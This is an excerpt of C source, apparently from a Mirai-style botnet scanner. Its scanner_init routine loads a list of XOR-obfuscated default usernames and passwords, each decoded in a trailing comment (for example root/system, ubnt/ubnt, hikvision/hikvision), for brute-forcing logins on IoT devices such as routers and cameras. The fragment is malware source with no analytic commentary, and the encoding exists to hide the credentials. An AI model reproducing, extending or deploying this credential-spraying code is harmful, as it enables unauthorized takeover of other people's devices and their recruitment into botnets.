...
void scanner_init(void)
{
    ...
    add_auth_entry("\x27\x21\x24\x24\x3B\x26\x20", "\x27\x21\x24\x24\x3B\x26\x20", 14); // support support
    add_auth_entry("\x21\x27\x31\x26", "\x21\x27\x31\x26", 8); // user user
    add_auth_entry("\x24\x35\x27\x27\x23\x3B\x26\x30", "\x24\x35\x27\x27\x23\x3B\x26\x30", 16); // password password
    add_auth_entry("\x26\x3B\x3B\x20", "\x27\x2D\x27\x20\x31\x39", 10); // root system
    add_auth_entry("\x27\x2D\x27\x20\x31\x39", "\x1B\x3F\x23\x1F\x37\x11\x17\x27\x6C\x25\x1E\x04\x66\x0E", 20); // system OkwKcECs8qJP2Z
    add_auth_entry("\x32\x20\x24", "\x32\x20\x24", 6); // ftp ftp
    add_auth_entry("\x27\x31\x26\x22\x3D\x37\x31", "\x27\x31\x26\x22\x3D\x37\x31", 14); // service service
    add_auth_entry("\x21\x36\x3A\x20", "\x21\x36\x3A\x20", 8); // ubnt ubnt
    add_auth_entry("\x26\x3B\x3B\x20", "\x2E\x38\x2C\x2C\x7A", 9); // root zlxx.
    add_auth_entry("\x35\x30\x39", "", 3); // adm
    add_auth_entry("\x26\x3B\x3B\x20", "", 4); // root
    add_auth_entry("\x30\x31\x32\x35\x21\x38\x20", "\x30\x31\x32\x35\x21\x38\x20", 14); // default default
    add_auth_entry("\x15\x30\x39\x3D\x3A\x3D\x27\x20\x26\x35\x20\x3B\x26", "\x35\x30\x39\x3D\x3A", 18); // Administrator admin
    add_auth_entry("\x3C\x3D\x3F\x22\x3D\x27\x3D\x3B\x3A", "\x3C\x3D\x3F\x22\x3D\x27\x3D\x3B\x3A", 18); // hikvision hikvision
